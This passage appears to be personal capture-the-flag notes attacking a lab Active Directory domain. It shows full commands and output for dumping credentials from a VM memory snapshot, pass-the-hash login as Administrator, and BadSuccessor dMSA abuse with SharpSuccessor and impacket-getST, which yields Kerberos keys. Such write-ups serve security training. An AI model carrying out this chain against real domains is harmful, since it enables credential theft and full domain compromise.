SMB         10.129.28.55    445    DC01             VMBackups       READ            
```

- Inside it I find a `vmem` file which i download to my local machine:
```
smbclient //10.129.28.55/VMBackups -U 'checkpoint.htb/svc_deploy%e16081eb077aca74bdbf8af12af43ac9' --pw-nt-hash

smb:> cd NightlyBackup_2024-11-01\
smb:> cd "memory forensics"
smb:> ls
smb:> get "Windows Server 2019-Snapshot1.vmem"
---OUTPUT-LS---
  .                                   D        0  Sat May  9 13:12:44 2026
  ..                                  D        0  Sat May  9 12:54:19 2026
  Windows Server 2019-000001.vmdk      A 106496000  Sat May  9 22:45:22 2026
  Windows Server 2019-Snapshot1.vmem      A 2147483648  Sat May  9 22:40:36 2026
  Windows Server 2019-Snapshot1.vmsn      A 138164859  Sat May  9 22:40:36 2026
  Windows Server 2019.nvram           A   270840  Sat May  9 22:39:00 2026
  Windows Server 2019.scoreboard      A     7642  Sat May  9 22:45:22 2026
  Windows Server 2019.vmdk            A 10199695360  Sat May  9 22:39:00 2026
  Windows Server 2019.vmsd            A      502  Sat May  9 22:39:00 2026
  Windows Server 2019.vmx             A     2749  Sat May  9 22:45:22 2026
  Windows Server 2019.vmxf            A      274  Sat May  9 22:22:44 2026

                10459391 blocks of size 4096. 2348722 blocks available
```

- Using volatility I can analyze the file and extract the hash. Note that I struggled a bit getting volatility to work properly. Finally what worked was installing it via `pipx`
```
pipx inject volatility3 pycryptodome
```

- I analyze the file looking for hashes and find the `Administrator` hash:
```
vol -f 'Windows Server 2019-Snapshot1.vmem' windows.hashdump.Hashdump | grep -i Administrator


--_RELEVANT-OUTPUT---
Administrator   500     aad3b435b51404eeaad3b435b51404ee        f29e9c014295b9b32139b09a2790be3b
```
![[Pasted image 20260617065753.png]]
- Using this hash I can log into the target as Administrator:
```
evil-winrm -i 10.129.28.55 -u Administrator -H f29e9c014295b9b32139b09a2790be3b
```
![[Pasted image 20260617065846.png]]

- I grab the root flag in `max.palmer`'s Desktop:
![[Pasted image 20260617065943.png]]

----
### Manual BadSuccessor exploit path:

- I could manually ccreate the dMSA exploit using the SharpSuccessor executable however I am unable to find the RC4 previous key hash after doing this. I tried a newer version of Rubeus but it seems to fail to run on target. So for now only bloodyAD gets the key I need.

- Exploiting SharpSuccessor on target:
```
.\SharpSuccessor.exe add /impersonate:svc_deploy /path:"OU=DMSAHolder,DC=checkpoint,DC=htb" /account:ryan.brooks /name:evilDMSA
   _____ _                      _____                                        
  / ____| |                    / ____|                                       
 | (___ | |__   __ _ _ __ _ __| (___  _   _  ___ ___ ___  ___ ___  ___  _ __ 
  \___ \| '_ \ / _` | '__| '_ \\___ \| | | |/ __/ __/ _ \/ __/ __|/ _ \| '__|
  ____) | | | | (_| | |  | |_) |___) | |_| | (_| (_|  __/\__ \__ \ (_) | |   
 |_____/|_| |_|\__,_|_|  | .__/_____/ \__,_|\___\___\___||___/___/\___/|_|   
                         | |                                                 
                         |_|                                                 
@_logangoins

[+] Adding dnshostname evilDMSA.checkpoint.htb
[+] Adding samaccountname evilDMSA$
[+] svc_deploy's DN identified
[+] Attempting to write msDS-ManagedAccountPrecededByLink
[+] Wrote attribute successfully
[+] Attempting to write msDS-DelegatedMSAState attribute
[+] Attempting to set access rights on the dMSA object
[+] Attempting to write msDS-SupportedEncryptionTypes attribute
[+] Attempting to write userAccountControl attribute
[+] Created dMSA object 'CN=evilDMSA' in 'OU=DMSAHolder,DC=checkpoint,DC=htb'
[+] Successfully weaponized dMSA object
[+] Found target account, attempting to write attributes
[+] CN=evilDMSA,OU=DMSAHolder,DC=checkpoint,DC=htb written to svc_deploy object
[+] msDS-SupersededServiceAccountState set to 2
[+] Wrote to target account successfully
```
![[Pasted image 20260618092413.png]]
- Now extract `ryan`'s ticket with Rubeus like before, convert it to a ccache and then pass the getST command to get the previous key:
```
faketime "+7hours" impacket-getST -impersonate 'evilDMSA$' -dmsa -k -no-pass checkpoint.htb/svc_deploy -self
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating evilDMSA$
[*] Requesting S4U2self
[*] Current keys:
[*] EncryptionTypes.aes256_cts_hmac_sha1_96:565a0e541e398c2730850c6d6e4b537e9b21920c04e7889baa1b1bf6c0dffc1d
[*] EncryptionTypes.aes128_cts_hmac_sha1_96:f87f1c211cd0343981b0493669d90fe9
[*] EncryptionTypes.rc4_hmac:abd2881f27b74ab7cbeda5e06664c60d
[*] Previous keys:
[*] EncryptionTypes.rc4_hmac:e16081eb077aca74bdbf8af12af43ac9
[*] Saving ticket in evilDMSA$@krbtgt_CHECKPOINT.HTB@CHECKPOINT.HTB.ccache
```
![[Pasted image 20260618102636.png]]